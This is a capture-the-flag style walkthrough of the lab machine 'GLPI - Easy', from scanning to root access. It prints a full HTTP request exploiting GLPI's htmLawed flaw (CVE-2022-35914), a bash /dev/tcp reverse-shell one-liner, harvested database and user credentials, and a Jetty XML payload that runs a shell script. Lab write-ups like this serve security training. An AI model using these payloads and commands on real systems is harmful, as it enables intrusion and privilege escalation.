---
icon: ubuntu
---

# GLPI - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.242 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 17:32 EDT
Nmap scan report for 192.168.118.242
Host is up (0.031s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Authentication - GLPI
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   31.15 ms 192.168.45.1
2   31.37 ms 192.168.45.254
3   31.77 ms 192.168.251.1
4   32.30 ms 192.168.118.242
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2106).png" alt=""><figcaption></figcaption></figure>

Found a login form, default credentials did not work for me here. I will try to do some directory busting

### <mark style="color:$primary;">Directory Busting</mark>

```
dirsearch -u http://192.168.118.242/
```

<figure><img src="../../.gitbook/assets/image (2107).png" alt=""><figcaption></figcaption></figure>

I found a couple of interesting files

<figure><img src="../../.gitbook/assets/image (2108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2109).png" alt=""><figcaption></figcaption></figure>

The CHANGELOG.md file reveals a version for GLPI! I am going to look for an exploit

### <mark style="color:$primary;">GLPI htmlawed (CVE-2022-35914) RCE</mark>

I found this [**article**](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/) revealing comand execution I am going to try it

<figure><img src="../../.gitbook/assets/image (2110).png" alt=""><figcaption></figcaption></figure>

my command is not executing!? After some time I realized that I had to thoroughly check phpinfo for disabled functions, and I found that exec is one of them. That's why my command is not working

<figure><img src="../../.gitbook/assets/image (2111).png" alt=""><figcaption></figcaption></figure>

Another way of getting this done is using array\_map. Here is a [**link** ](https://www.codeigniter.com/userguide3/general/hooks.html) on how they work&#x20;

Were gonna use burpsuite to make the request:

```
text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=id
```

<figure><img src="../../.gitbook/assets/image (2112).png" alt=""><figcaption></figcaption></figure>

It works. Here is the full Request:

```
POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 192.168.118.242
Content-Length: 75
Cache-Control: max-age=0
Origin: http://192.168.118.242
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.118.242/vendor/htmlawed/htmlawed/htmLawedTest.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: sid=bs
Connection: close

text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=id
```

Now let's a reverse shell. Make sure you have a listener ready. Were gonna use bash to get a reverse shell

```
bash -c 'bash -i >& /dev/tcp/192.168.45.158/80 0>&1'
```

<figure><img src="../../.gitbook/assets/image (2113).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2114).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2117).png" alt=""><figcaption></figcaption></figure>

Only 2 users betty and root. I'll keep betty in mind while searching for creds in files.

Found database creds in config file

<figure><img src="../../.gitbook/assets/image (2115).png" alt=""><figcaption></figcaption></figure>

Let's checkout the database

```
mysql -h localhost -u glpi -pglpi_db_password -D glpi
```

we got the betty user's password

<figure><img src="../../.gitbook/assets/image (2116).png" alt=""><figcaption></figcaption></figure>

```
SnowboardSkateboardRoller234
```

Found betty's password!

<figure><img src="../../.gitbook/assets/image (2118).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">**Linpeas**</mark>

<figure><img src="../../.gitbook/assets/image (2119).png" alt=""><figcaption></figcaption></figure>

Linpeas reveals there is something on port 8080

<figure><img src="../../.gitbook/assets/image (2120).png" alt=""><figcaption></figcaption></figure>

There is jetty writen all over, pretty sure Jetty is hosted on port 8080 :joy:

<figure><img src="../../.gitbook/assets/image (2121).png" alt=""><figcaption></figcaption></figure>

betty has write permissions on the webapps directory!

### <mark style="color:$primary;">Jetty RCE</mark>

<figure><img src="../../.gitbook/assets/image (2122).png" alt=""><figcaption></figcaption></figure>

Before I do anything else, I am going to create an ssh key for betty. So I have access to a better shell:

<figure><img src="../../.gitbook/assets/image (2123).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2124).png" alt=""><figcaption></figcaption></figure>

First, I will create a bash script containing the reverse shell code & prep a listener

<figure><img src="../../.gitbook/assets/image (2126).png" alt=""><figcaption></figcaption></figure>

And before uploading the XML file, I will setup a reverse shell on port 1337.

```
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "<https://www.eclipse.org/jetty/configure_10_0.dtd>">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/bin/bash</Item>
                    <Item>-c</Item>
                    <Item>/tmp/run.sh</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>

```

<figure><img src="../../.gitbook/assets/image (2127).png" alt=""><figcaption></figcaption></figure>

And we got a shell as root! TBH this took some time!

